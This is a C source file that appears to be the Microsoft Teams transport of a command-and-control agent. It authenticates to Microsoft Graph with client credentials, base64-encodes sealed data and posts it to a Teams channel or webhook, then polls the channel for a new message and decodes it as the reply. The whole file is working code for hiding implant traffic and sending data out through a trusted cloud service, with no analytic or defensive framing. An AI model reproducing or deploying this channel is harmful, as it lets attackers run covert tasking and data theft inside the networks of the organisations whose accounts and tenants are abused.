#include "common.h"
#include "crypto.h"
#include "http.h"
#include "teams.h"
#include "cJSON.h"

char teams_graph_base[160] = "https://graph.microsoft.com/v1.0";
char teams_login_base[160] = "https://login.microsoftonline.com";

char *teams_form_encode(const char *s) {
    size_t i, n = strlen(s);
    char *dst = (char *)malloc(n * 3 + 1), *w;
    if (!dst)
        return NULL;
    w = dst;
    for (i = 0; i < n; i++) {
        unsigned char c = (unsigned char)s[i];
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') ||
            c == '-' || c == '_' || c == '.' || c == '~') {
            *w++ = (char)c;
        } else {
            sprintf(w, "%%%02X", c);
            w += 3;
        }
    }
    *w = '\0';
    return dst;
}

char *teams_card_json(const char *body) {
    cJSON *root = NULL, *att = NULL, *card = NULL, *arr = NULL, *blk = NULL;
    char *card_text = NULL, *out = NULL;
    root = cJSON_CreateObject();
    card = cJSON_CreateObject();
    if (!root || !card)
        goto done;
    cJSON_AddStringToObject(card, "$schema", "http://adaptivecards.io/schemas/adaptive-card.json");
    cJSON_AddStringToObject(card, "type", "AdaptiveCard");
    cJSON_AddStringToObject(card, "version", "1.2");
    arr = cJSON_AddArrayToObject(card, "body");
    blk = cJSON_CreateObject();
    if (!arr || !blk)
        goto done;
    cJSON_AddStringToObject(blk, "type", "TextBlock");
    cJSON_AddStringToObject(blk, "text", body);
    cJSON_AddTrueToObject(blk, "wrap");
    cJSON_AddItemToArray(arr, blk);
    blk = NULL;
    card_text = cJSON_PrintUnformatted(card);
    if (!card_text)
        goto done;
    cJSON_AddStringToObject(root, "type", "message");
    arr = cJSON_AddArrayToObject(root, "attachments");
    att = cJSON_CreateObject();
    if (!arr || !att)
        goto done;
    cJSON_AddStringToObject(att, "contentType", "application/vnd.microsoft.card.adaptive");
    cJSON_AddNullToObject(att, "contentUrl");
    cJSON_AddStringToObject(att, "content", card_text);
    cJSON_AddItemToArray(arr, att);
    att = NULL;
    out = cJSON_PrintUnformatted(root);
done:
    if (blk)
        cJSON_Delete(blk);
    if (att)
        cJSON_Delete(att);
    if (root)
        cJSON_Delete(root);
    if (card)
        cJSON_Delete(card);
    free(card_text);
    return out;
}

/* Split an http(s) URL into secure/host/port/path. */
static int split_url(const char *url, int *secure, char *host, size_t hcap,
                     int *port, char *path, size_t pcap) {
    const char *p, *slash;
    size_t n;
    if (strncmp(url, "https://", 8) == 0) {
        *secure = 1;
        *port = 443;
        p = url + 8;
    } else if (strncmp(url, "http://", 7) == 0) {
        *secure = 0;
        *port = 80;
        p = url + 7;
    } else {
        return -1;
    }
    slash = strchr(p, '/');
    n = slash ? (size_t)(slash - p) : strlen(p);
    {
        const char *colon = (const char *)memchr(p, ':', n);
        if (colon) {
            *port = atoi(colon + 1);
            n = (size_t)(colon - p);
        }
    }
    if (n == 0 || n >= hcap)
        return -1;
    memcpy(host, p, n);
    host[n] = '\0';
    strncpy(path, slash ? slash : "/", pcap - 1);
    path[pcap - 1] = '\0';
    return 0;
}

static const char *jstr(cJSON *o, const char *k) {
    cJSON *v = cJSON_GetObjectItemCaseSensitive(o, k);
    if (!v || !cJSON_IsString(v) || !v->valuestring)
        return "";
    return v->valuestring;
}

/* Extra headers block: UA plus optional bearer. Caller frees. */
static char *mk_headers(const agent_config_t *cfg, const char *token) {
    size_t n = 1;
    char *h;
    if (cfg->teams_ua[0])
        n += strlen("User-Agent: \r\n") + strlen(cfg->teams_ua);
    if (token)
        n += strlen("Authorization: Bearer \r\n") + strlen(token);
    n += strlen("Content-Type: application/json\r\n");
    h = (char *)malloc(n);
    if (!h)
        return NULL;
    h[0] = '\0';
    if (cfg->teams_ua[0]) {
        strcat(h, "User-Agent: ");
        strcat(h, cfg->teams_ua);
        strcat(h, "\r\n");
    }
    if (token) {
        strcat(h, "Authorization: Bearer ");
        strcat(h, token);
        strcat(h, "\r\n");
    }
    strcat(h, "Content-Type: application/json\r\n");
    return h;
}

static int teams_auth(const agent_config_t *cfg, teams_state_t *st) {
    char host[128], base_path[128], path[256], form[1024];
    char *enc_id = NULL, *enc_sec = NULL;
    unsigned char *resp = NULL;
    size_t resp_len = 0;
    int secure, port, status = 0, rc = -1;
    cJSON *root = NULL;
    if (st->token[0] != '\0' && GetTickCount64() + 60000 < st->expiry)
        return 0;
    if (split_url(teams_login_base, &secure, host, sizeof(host), &port, base_path, sizeof(base_path)) != 0)
        return -1;
    if (base_path[0] == '\0' || strcmp(base_path, "/") == 0)
        snprintf(path, sizeof(path), "/%s/oauth2/v2.0/token", cfg->teams_tenant);
    else
        snprintf(path, sizeof(path), "%s/%s/oauth2/v2.0/token", base_path, cfg->teams_tenant);
    enc_id = teams_form_encode(cfg->teams_client);
    enc_sec = teams_form_encode(cfg->teams_secret);
    if (!enc_id || !enc_sec)
        goto done;
    snprintf(form, sizeof(form),
             "grant_type=client_credentials&scope=https%%3A%%2F%%2Fgraph.microsoft.com%%2F.default&client_id=%s&client_secret=%s",
             enc_id, enc_sec);
    {
        char headers[640];
        headers[0] = '\0';
        if (cfg->teams_ua[0]) {
            strcat(headers, "User-Agent: ");
            strcat(headers, cfg->teams_ua);
            strcat(headers, "\r\n");
        }
        strcat(headers, "Content-Type: application/x-www-form-urlencoded\r\n");
        rc = http_request(cfg, host, secure, port, "POST", path, headers,
                          (const unsigned char *)form, strlen(form),
                          &resp, &resp_len, &status);
    }
    if (rc != 0 || status != 200)
        goto done;
    root = cJSON_ParseWithLength((const char *)resp, (int)resp_len);
    if (!root)
        goto done;
    if (jstr(root, "access_token")[0] == '\0')
        goto done;
    strncpy(st->token, jstr(root, "access_token"), sizeof(st->token) - 1);
    st->token[sizeof(st->token) - 1] = '\0';
    {
        cJSON *e = cJSON_GetObjectItemCaseSensitive(root, "expires_in");
        int secs = (e && cJSON_IsNumber(e) && e->valueint > 0) ? e->valueint : 3600;
        st->expiry = GetTickCount64() + (unsigned long long)secs * 1000;
    }
    rc = 0;
done:
    free(enc_id);
    free(enc_sec);
    free(resp);
    if (root)
        cJSON_Delete(root);
    return rc;
}

typedef struct {
    char *id;
    char *content;
} teams_msg_t;

static void msgs_free(teams_msg_t *msgs, int n) {
    int i;
    for (i = 0; i < n; i++) {
        free(msgs[i].id);
        free(msgs[i].content);
    }
    free(msgs);
}

static char *dupstr(const char *s) {
    size_t n = strlen(s) + 1;
    char *d = (char *)malloc(n);
    if (d)
        memcpy(d, s, n);
    return d;
}

/* GET channel messages (newest first). Caller frees via msgs_free. */
static int teams_list(const agent_config_t *cfg, teams_state_t *st,
                      teams_msg_t **msgs, int *count) {
    char host[128], base[128], path[640], *headers = NULL;
    unsigned char *resp = NULL;
    size_t resp_len = 0;
    int secure, port, status = 0, rc = -1, i, n = 0;
    cJSON *root = NULL, *value = NULL;
    teams_msg_t *arr = NULL;
    *msgs = NULL;
    *count = 0;
    if (teams_auth(cfg, st) != 0)
        return -1;
    if (split_url(teams_graph_base, &secure, host, sizeof(host), &port, base, sizeof(base)) != 0)
        return -1;
    snprintf(path, sizeof(path), "%s/teams/%s/channels/%s/messages?$top=10",
             base, cfg->teams_team, cfg->teams_channel);
    headers = mk_headers(cfg, st->token);
    if (!headers)
        return -1;
    /* GET has no body; drop the JSON content type (harmless either way). */
    rc = http_request(cfg, host, secure, port, "GET", path, headers, NULL, 0,
                      &resp, &resp_len, &status);
    free(headers);
    if (rc != 0 || status != 200)
        goto done;
    root = cJSON_ParseWithLength((const char *)resp, (int)resp_len);
    if (!root)
        goto done;
    value = cJSON_GetObjectItemCaseSensitive(root, "value");
    if (!value || !cJSON_IsArray(value))
        goto done;
    n = cJSON_GetArraySize(value);
    arr = (teams_msg_t *)calloc(n > 0 ? (size_t)n : 1, sizeof(teams_msg_t));
    if (!arr)
        goto done;
    for (i = 0; i < n; i++) {
        cJSON *m = cJSON_GetArrayItem(value, i);
        cJSON *b = cJSON_GetObjectItemCaseSensitive(m, "body");
        const char *type = jstr(m, "messageType");
        if (strcmp(type, "message") != 0)
            continue;
        arr[*count].id = dupstr(jstr(m, "id"));
        arr[*count].content = dupstr(b ? jstr(b, "content") : "");
        if (!arr[*count].id || !arr[*count].content) {
            msgs_free(arr, *count + 1);
            arr = NULL;
            goto done;
        }
        (*count)++;
    }
    *msgs = arr;
    arr = NULL;
    rc = 0;
done:
    free(resp);
    if (root)
        cJSON_Delete(root);
    return rc;
}

static int teams_send_graph(const agent_config_t *cfg, teams_state_t *st,
                            const char *body, char **id_out) {
    char host[128], base[128], path[640], *headers = NULL, *payload = NULL;
    unsigned char *resp = NULL;
    size_t resp_len = 0;
    int secure, port, status = 0, rc = -1;
    cJSON *root = NULL, *bobj = NULL, *parsed = NULL;
    *id_out = NULL;
    if (teams_auth(cfg, st) != 0)
        return -1;
    if (split_url(teams_graph_base, &secure, host, sizeof(host), &port, base, sizeof(base)) != 0)
        return -1;
    snprintf(path, sizeof(path), "%s/teams/%s/channels/%s/messages",
             base, cfg->teams_team, cfg->teams_channel);
    root = cJSON_CreateObject();
    bobj = cJSON_CreateObject();
    if (!root || !bobj)
        goto done;
    cJSON_AddStringToObject(bobj, "contentType", "text");
    cJSON_AddStringToObject(bobj, "content", body);
    cJSON_AddItemToObject(root, "body", bobj);
    bobj = NULL;
    payload = cJSON_PrintUnformatted(root);
    headers = mk_headers(cfg, st->token);
    if (!payload || !headers)
        goto done;
    rc = http_request(cfg, host, secure, port, "POST", path, headers,
                      (const unsigned char *)payload, strlen(payload),
                      &resp, &resp_len, &status);
    if (rc != 0 || (status != 200 && status != 201))
        goto done;
    parsed = cJSON_ParseWithLength((const char *)resp, (int)resp_len);
    if (!parsed || jstr(parsed, "id")[0] == '\0')
        goto done;
    *id_out = dupstr(jstr(parsed, "id"));
    rc = *id_out ? 0 : -1;
done:
    if (bobj)
        cJSON_Delete(bobj);
    if (root)
        cJSON_Delete(root);
    if (parsed)
        cJSON_Delete(parsed);
    free(payload);
    free(headers);
    free(resp);
    return rc;
}

static int teams_send_webhook(const agent_config_t *cfg, const char *body) {
    char host[256], path[768], *headers = NULL, *payload = NULL;
    unsigned char *resp = NULL;
    size_t resp_len = 0;
    int secure, port, status = 0, rc = -1;
    if (split_url(cfg->teams_webhook, &secure, host, sizeof(host), &port, path, sizeof(path)) != 0)
        return -1;
    payload = teams_card_json(body);
    headers = mk_headers(cfg, NULL);
    if (!payload || !headers)
        goto done;
    rc = http_request(cfg, host, secure, port, "POST", path, headers,
                      (const unsigned char *)payload, strlen(payload),
                      &resp, &resp_len, &status);
    if (rc != 0 || (status != 200 && status != 201 && status != 202))
        goto done;
    rc = 0;
done:
    free(payload);
    free(headers);
    free(resp);
    return rc;
}

static int id_known(char **ids, int n, const char *id) {
    int i;
    for (i = 0; i < n; i++)
        if (strcmp(ids[i], id) == 0)
            return 1;
    return 0;
}

int teams_exchange(const agent_config_t *cfg, teams_state_t *st,
                   const unsigned char *sealed, size_t sealed_len,
                   unsigned char **out, size_t *out_len) {
    char *body = NULL, *own_id = NULL, **known = NULL;
    int nknown = 0, i, rc = -1;
    unsigned long long deadline;
    teams_msg_t *msgs = NULL;
    int nmsgs = 0;
    *out = NULL;
    *out_len = 0;
    body = b64_encode(sealed, sealed_len, NULL);
    if (!body)
        return -1;
    if (teams_list(cfg, st, &msgs, &nmsgs) != 0)
        goto done;
    known = (char **)calloc(nmsgs > 0 ? (size_t)nmsgs : 1, sizeof(char *));
    if (!known) {
        msgs_free(msgs, nmsgs);
        goto done;
    }
    for (i = 0; i < nmsgs; i++) {
        known[i] = msgs[i].id;
        msgs[i].id = NULL; /* steal */
    }
    nknown = nmsgs;
    msgs_free(msgs, nmsgs);
    msgs = NULL;
    if (cfg->teams_webhook[0] != '\0') {
        if (teams_send_webhook(cfg, body) != 0)
            goto done;
    } else {
        if (teams_send_graph(cfg, st, body, &own_id) != 0)
            goto done;
    }
    deadline = GetTickCount64() + 90000;
    for (;;) {
        if (teams_list(cfg, st, &msgs, &nmsgs) != 0)
            goto done;
        for (i = 0; i < nmsgs; i++) {
            if (msgs[i].id[0] == '\0' || id_known(known, nknown, msgs[i].id))
                continue;
            if (own_id && strcmp(msgs[i].id, own_id) == 0)
                continue;
            if (msgs[i].content[0] == '\0' || strcmp(msgs[i].content, body) == 0)
                continue;
            *out = b64_decode(msgs[i].content, out_len);
            msgs_free(msgs, nmsgs);
            msgs = NULL;
            if (!*out)
                goto done;
            rc = 0;
            goto done;
        }
        msgs_free(msgs, nmsgs);
        msgs = NULL;
        if ((long long)(GetTickCount64() - deadline) >= 0)
            goto done;
        Sleep(3000);
    }
done:
    free(body);
    free(own_id);
    for (i = 0; i < nknown; i++)
        free(known[i]);
    free(known);
    if (msgs)
        msgs_free(msgs, nmsgs);
    return rc;
}
